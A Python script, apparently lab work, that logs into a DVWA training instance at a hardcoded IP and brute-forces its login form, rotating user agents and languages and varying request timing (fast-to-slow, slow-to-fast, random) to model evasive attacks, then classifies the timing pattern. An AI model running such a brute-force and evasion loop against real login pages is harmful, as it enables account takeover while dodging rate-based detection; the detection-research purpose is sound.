import requests
import time
import random
import numpy as np
from bs4 import BeautifulSoup

BASE_URL = "http://3.35.229.63:8000"
LOGIN_URL = BASE_URL + "/login.php"
BRUTE_URL = BASE_URL + "/vulnerabilities/brute/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/122.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1)",
    "Mozilla/5.0 Firefox/124.0"
]

USER_IDS = ["admin", "root", "user", "test", "guest"]

# =========================
# 패턴 선택
# =========================
print("""
1. 빠르게 → 느리게
2. 느리게 → 빠르게
3. 랜덤 (8~60초)
4. 수동 입력
5. 일반 브루트포스 (고정)
""")

mode = int(input("패턴 선택: "))
count = int(input("시도 횟수: "))

intervals = []
prev_time = None

# =========================
# 세션 + 로그인
# =========================
session = requests.Session()

session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Referer": LOGIN_URL
})

# 🔥 토큰 가져오기
res = session.get(LOGIN_URL)
soup = BeautifulSoup(res.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

# 🔥 로그인
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

res = session.post(LOGIN_URL, data=login_data)

if "login.php" in res.url:
    print("❌ 로그인 실패")
    exit()
else:
    print("✅ 로그인 성공")

session.cookies.set("security", "high")       #DVWA 보안 설정 변경 

# =========================
# 공격 시작
# =========================
for i in range(count):

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(["ko-KR", "en-US", "ja-JP"])
    }

    username = random.choice(USER_IDS)
    password = f"guess{i}"

    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    try:
        res = session.get(
            BRUTE_URL,
            params=params,
            headers=headers,
            timeout=5
        )

        print(f"[{i}] id={username} pw={password} | status={res.status_code}")

        if "login.php" in res.url:
            print("⚠️ 세션 끊김")
            break

    except Exception as e:
        print(f"[!] 요청 실패: {e}")
        continue

    # =========================
    # interval 계산
    # =========================
    now = time.time()
    if prev_time:
        interval = now - prev_time
        intervals.append(interval)
    prev_time = now

    # =========================
    # 패턴별 대기
    # =========================
    if mode == 1:
        wait = random.uniform(1, 2) if i < count//2 else random.uniform(8, 20)
    elif mode == 2:
        wait = random.uniform(8, 20) if i < count//2 else random.uniform(1, 2)
    elif mode == 3:
        wait = random.uniform(8, 60)
    elif mode == 4:
        wait = float(input("대기 시간 입력: "))
    elif mode == 5:
        wait = 1
    else:
        wait = 3

    print(f"    → wait={wait:.2f}s")
    time.sleep(wait)

# =========================
# 분석 결과
# =========================
print("\n===== 분석 결과 =====")

if len(intervals) > 1:
    avg = np.mean(intervals)
    std = np.std(intervals)
    cv = std / avg if avg != 0 else 0

    print(f"평균 간격: {avg:.2f}")
    print(f"표준편차: {std:.4f}")
    print(f"CV: {cv:.4f}")

    if std < 0.3:
        print("👉 일반 브루트포스")
    elif std < 3 and avg > 5:
        print("👉 슬로우 브루트포스")
    elif std >= 3:
        print("👉 랜덤/우회 공격")
    else:
        print("👉 불명확")

else:
    print("데이터 부족")